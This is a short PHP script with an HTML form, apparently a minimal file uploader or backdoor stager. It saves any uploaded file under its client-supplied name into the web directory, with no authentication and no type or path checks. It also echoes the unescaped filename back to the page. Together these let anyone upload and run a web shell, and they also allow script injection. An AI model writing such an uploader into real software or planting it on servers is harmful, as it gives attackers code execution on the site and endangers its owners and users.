<?php 
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "Uploaded: " . $_FILES['f']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f">
    <button>Upload</button>
</form>
